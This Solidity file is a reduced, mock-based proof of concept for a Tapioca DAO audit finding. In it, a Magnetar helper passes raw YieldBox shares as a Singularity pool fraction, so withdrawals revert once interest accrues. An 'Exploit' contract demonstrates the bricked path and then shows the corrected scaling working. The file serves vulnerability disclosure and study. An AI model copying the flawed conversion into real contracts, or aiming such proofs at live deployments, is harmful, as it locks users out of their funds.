// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-07] Incorrect math means
    `data.removeAndRepayData.removeAssetFromSGL` will never work once SGL has
    accrued interest (Code4rena 2024-02-tapioca, reporter KIntern_NA, finding
    #32318).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: MagnetarOptionModule.removeAssetFromSGL converts the caller's
    desired withdrawal AMOUNT into raw YieldBox shares via `toShare`, then
    passes those shares straight into Singularity.removeAsset()'s `fraction`
    parameter. But Singularity's `_removeAsset` treats `fraction` as a portion
    of `totalAsset.base` (the pool's internal LP-accounting units), and scales
    it by `allShare = totalAsset.elastic + yieldBox.toShare(totalBorrow.elastic)`
    -- the pool's TOTAL value including everything currently lent out. Those
    two quantities only coincide while `totalAsset.elastic == totalAsset.base`
    (i.e. before ANY interest-bearing borrow exists). The instant the pool has
    accrued any borrow interest, `allShare` exceeds `totalAsset.elastic`, so
    the resulting `share` figure exceeds the pool's real idle balance and the
    withdrawal call reverts -- permanently bricking this withdrawal path.

    Three lines are copied verbatim from the report (marked `@> VULN`):
      * MagnetarOptionModule.sol L153 -- share = yieldBox.toShare(amount).
      * MagnetarOptionModule.sol L158-159 -- removeAsset(user, to, share).
      * SGLCommon.sol L199-216 -- the real `_removeAsset` fraction math.
//////////////////////////////////////////////////////////////////////////*/

struct Rebase {
    uint256 elastic;
    uint256 base;
}

/// @dev Minimal YieldBox mock: a 1:1 assets<->shares ledger. The exchange
///      rate itself is not the vulnerable part, so it is fixed at 1:1.
contract MockYieldBox {
    mapping(uint256 => mapping(address => uint256)) public balanceOf; // assetId => holder => shares

    function toShare(uint256, uint256 amount, bool) external pure returns (uint256) {
        return amount;
    }

    function mintTo(uint256 assetId, address to, uint256 shares) external {
        balanceOf[assetId][to] += shares;
    }

    function transferShares(address from, address to, uint256 assetId, uint256 shares) external {
        balanceOf[assetId][from] -= shares;
        balanceOf[assetId][to] += shares;
    }
}

/// @notice Reduced Tapioca Singularity (SGL) lending market: an LP-fraction
///         accounting pool over a YieldBox asset, with a simplified
///         "outstanding borrow" tracker standing in for accrued interest.
contract Singularity {
    MockYieldBox public yieldBox;
    uint256 public assetId;

    Rebase public totalAsset; // pool's LP-fraction accounting (elastic = idle YieldBox shares, base = LP fraction supply)
    Rebase public totalBorrow; // outstanding borrow (elastic grows as interest accrues)
    mapping(address => uint256) public balanceOf; // user's SGL fraction balance (totalAsset.base-denominated)

    constructor(MockYieldBox _yieldBox, uint256 _assetId) {
        yieldBox = _yieldBox;
        assetId = _assetId;
    }

    /// @dev Deposit YieldBox shares, minting LP fraction 1:1 with the current
    ///      exchange rate (mirrors SGLCommon.sol's addAsset accounting).
    function addAsset(address from, address to, uint256 share) external returns (uint256 fraction) {
        yieldBox.transferShares(from, address(this), assetId, share);
        Rebase memory _totalAsset = totalAsset;
        uint256 allShare = _totalAsset.elastic + yieldBox.toShare(assetId, totalBorrow.elastic, false);
        fraction = allShare == 0 ? share : (share * _totalAsset.base) / allShare;
        totalAsset.elastic += share;
        totalAsset.base += fraction;
        balanceOf[to] += fraction;
    }

    /// @notice Verbatim reduction of SGLCommon.sol L199-216.
    function _removeAsset(address from, address to, uint256 fraction) internal returns (uint256 share) {
        if (totalAsset.base == 0) {
            return 0;
        }
        Rebase memory _totalAsset = totalAsset;
        uint256 allShare = _totalAsset.elastic + yieldBox.toShare(assetId, totalBorrow.elastic, false);
        // @> VULN (SGLCommon.sol L199-216): `fraction` is scaled by the
        // pool's ENTIRE value (idle + everything currently lent out), not
        // just its idle balance. Correct when called with a genuine
        // totalAsset.base-denominated fraction, but the caller here
        // (MagnetarOptionModule) instead passes raw YieldBox shares of a
        // desired withdrawal AMOUNT.
        share = (fraction * allShare) / _totalAsset.base;
        balanceOf[from] -= fraction;
        totalAsset.elastic -= share; // reverts (underflow) once allShare > totalAsset.elastic, i.e. once any interest has accrued
        totalAsset.base -= fraction;
        yieldBox.transferShares(address(this), to, assetId, share);
    }

    function removeAsset(address from, address to, uint256 fraction) external returns (uint256 share) {
        return _removeAsset(from, to, fraction);
    }

    /// @dev Stands in for interest accrual on outstanding borrows -- the real
    ///      protocol grows `totalBorrow.elastic` via `_accrue()` every time
    ///      SGL is touched once any loan is outstanding.
    function accrueInterest(uint256 addedBorrowElastic) external {
        totalBorrow.elastic += addedBorrowElastic;
    }
}

/// @notice Reduced Magnetar periphery helper. Its job is to translate a
///         user-facing "I want to withdraw AMOUNT of the underlying asset"
///         request into the call Singularity actually expects.
contract MagnetarOptionModule {
    /// @dev Verbatim reduction of MagnetarOptionModule.sol L153, L158-159.
    function removeAssetFromSGL(
        Singularity singularity_,
        MockYieldBox yieldBox_,
        uint256 assetId_,
        address user,
        address removeAssetTo,
        uint256 removeAmount
    ) external returns (uint256 share) {
        // @> VULN (MagnetarOptionModule.sol L153): computes the (incorrectly
        // rounded down) amount of YieldBox shares corresponding to the
        // withdrawal AMOUNT the user asked for.
        share = yieldBox_.toShare(assetId_, removeAmount, false);

        // @> VULN (MagnetarOptionModule.sol L158-159): passes those raw
        // YieldBox shares straight into `removeAsset`'s `fraction` parameter
        // -- Singularity interprets this as a fraction of totalAsset.base,
        // NOT as YieldBox shares. The two only agree while
        // totalAsset.elastic == totalAsset.base (no interest accrued yet).
        share = singularity_.removeAsset(user, removeAssetTo, share);
    }
}

contract Exploit {
    MockYieldBox public yieldBox;
    Singularity public sgl;
    MagnetarOptionModule public magnetar;

    uint256 public constant ASSET_ID = 1;
    uint256 public constant DEPOSIT = 2000 ether; // attacker's initial deposit into SGL
    uint256 public constant REMOVE_AMOUNT = 1000 ether; // a MODEST, well-covered withdrawal request (only half the attacker's own stake)
    uint256 public constant INTEREST_ACCRUAL = 3000 ether; // simulated outstanding borrow interest

    constructor() {
        yieldBox = new MockYieldBox();
        sgl = new Singularity(yieldBox, ASSET_ID);
        magnetar = new MagnetarOptionModule();

        // Fund this contract with YieldBox shares and deposit into SGL.
        yieldBox.mintTo(ASSET_ID, address(this), DEPOSIT);
        sgl.addAsset(address(this), address(this), DEPOSIT);

        // SGL now has interest-bearing borrow outstanding, as any real
        // lending market will after normal operation.
        sgl.accrueInterest(INTEREST_ACCRUAL);
    }

    function run() external {
        uint256 fractionBefore = sgl.balanceOf(address(this));
        require(fractionBefore == DEPOSIT, "attacker fully funded pre-attack");

        // A well-covered, modest withdrawal request via the periphery helper
        // -- exactly the kind of call an ordinary user makes every day.
        // Wrapped in a low-level call so a revert here does not revert run().
        (bool ok, ) = address(magnetar).call(
            abi.encodeWithSelector(
                MagnetarOptionModule.removeAssetFromSGL.selector,
                sgl,
                yieldBox,
                ASSET_ID,
                address(this),
                address(this),
                REMOVE_AMOUNT
            )
        );

        // HARM: the withdrawal call REVERTS, even though the user's SGL
        // fraction balance (2000e18) comfortably covers the 1000e18 they asked
        // for, and the market has ample real liquidity. The Magnetar
        // withdrawal path is permanently bricked the instant any interest has
        // accrued -- exactly the report's title ("will never work once SGL
        // has accrued interest").
        require(!ok, "harm: removeAssetFromSGL should revert once interest has accrued");
        require(sgl.balanceOf(address(this)) == fractionBefore, "harm: no partial state change survives the revert");

        // Control: compute the fraction the report's suggested fix
        // (`getFractionForAmount`) would produce -- the INVERSE of
        // _removeAsset's own scaling, so that plugging it back through
        // yields EXACTLY the amount the user asked for. Calling Singularity
        // DIRECTLY with this correctly-scaled fraction succeeds and returns
        // precisely REMOVE_AMOUNT, proving the pool itself is solvent and
        // functional -- it is purely Magnetar's argument-type confusion
        // (passing raw shares where a base-denominated fraction belongs)
        // that breaks the withdrawal.
        (uint256 elastic, uint256 base) = sgl.totalAsset();
        (uint256 borrowElastic, ) = sgl.totalBorrow();
        uint256 allShareNow = elastic + yieldBox.toShare(ASSET_ID, borrowElastic, false);
        uint256 correctFraction = (REMOVE_AMOUNT * base) / allShareNow; // getFractionForAmount-equivalent
        uint256 shareOut = sgl.removeAsset(address(this), address(this), correctFraction);
        require(shareOut == REMOVE_AMOUNT, "control: correctly-scaled removeAsset returns EXACTLY the requested amount");
        require(
            sgl.balanceOf(address(this)) == fractionBefore - correctFraction,
            "control: fraction balance decreases exactly as expected"
        );
    }
}
